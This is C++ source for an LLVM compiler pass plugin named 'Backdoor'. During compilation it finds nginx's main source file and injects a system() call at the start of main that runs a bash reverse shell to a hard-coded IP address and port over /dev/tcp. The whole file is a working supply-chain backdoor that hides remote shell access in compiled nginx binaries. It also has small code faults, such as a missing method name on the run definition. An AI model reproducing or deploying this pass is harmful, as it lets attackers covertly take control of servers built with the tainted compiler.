#include "llvm/Passes/PassPlugin.h"
#include "llvm/Passes/PassBuilder.h"
#include "llvm/IR/IRBuilder.h"
#include "llvm/IR/PassManager.h"
#include "llvm/Pass.h"

using namespace llvm;

// Pass info struct
struct Backdoor : public llvm::PassInfoMixin<Backdoor> {
  llvm::PreservedAnalyses run(llvm::Module &M, llvm::ModuleAnalysisManager &);
  bool runOnModule(llvm::Module &M);
  static bool isRequired() { return true; }
};

// This function will be run on every module encountered in the compilation target
// It is the implementation of the pass
bool Backdoor::runOnModule(Module &M) {
  bool modified = false;

  // look for nginx main module, ie. C file nginx.c
  if (M.getName() == "src/core/nginx.c") {

    auto &CTX = M.getContext();
	
	// Inject the declaration of system function
    PointerType *SystemArgTy = PointerType::getUnqual(Type::getInt8Ty(CTX));
    FunctionType *SystemTy = FunctionType::get(IntegerType::getInt32Ty(CTX), SystemArgTy, false);
    FunctionCallee System = M.getOrInsertFunction("system", SystemTy);

    Function *SystemF= dyn_cast<Function>(System.getCallee());
    SystemF->setDoesNotThrow();
    SystemF->addParamAttr(0, Attribute::ReadOnly);

	// Inject global variable that holds the bash command string 
    llvm::Constant *SystemCommand = llvm::ConstantDataArray::getString(CTX, "bash -c 'bash -i >& /dev/tcp/172.31.20.178/8000 0>&1  &'"); 

    Constant *SystemCommandStr = M.getOrInsertGlobal("SystemCommand", SystemCommand->getType());
    dyn_cast<GlobalVariable>(SystemCommandStr)->setInitializer(SystemCommand);

	// Iterate through functions in this module and look for main function
    for (auto &F : M) {
      if (F.getName() == "main") {

		// Create an IRBuilder that is set to the first insertion point in the first basic block
        IRBuilder<> Builder(&*F.getEntryBlock().getFirstInsertionPt());
        auto FuncName = Builder.CreateGlobalString(F.getName());
		
		// Cast system command string array to pointer 
        llvm::Value *CommandPtr = Builder.CreatePointerCast(SystemCommandStr, SystemArgTy, "command");

		// Create the system function call with the command string argument
        outs() << " Backdoor code inserted in " << F.getName() << "\n";
        Builder.CreateCall(System, {CommandPtr, FuncName, Builder.getInt32(F.arg_size())});

        modified = true;
      }
    }
  }
  return modified;
}

PreservedAnalyses Backdoor:: (llvm::Module &M, llvm::ModuleAnalysisManager &) {
  bool Changed =  runOnModule(M);
  return (Changed ? llvm::PreservedAnalyses::none() : llvm::PreservedAnalyses::all());
}

// Registration of the plugin with the new pass manager
llvm::PassPluginLibraryInfo getBackdoorPluginInfo() {
  return {LLVM_PLUGIN_API_VERSION, "backdoor", LLVM_VERSION_STRING,
          [](PassBuilder &PB) {
            PB.registerPipelineStartEPCallback(
                [](ModulePassManager &MPM, OptimizationLevel Level) {         
                  MPM.addPass(Backdoor());
                  return true;
                });
           }
         };
}

// The public entry point for this pass plugin
extern "C" LLVM_ATTRIBUTE_WEAK ::llvm::PassPluginLibraryInfo
llvmGetPassPluginInfo() {
  return getBackdoorPluginInfo();
}




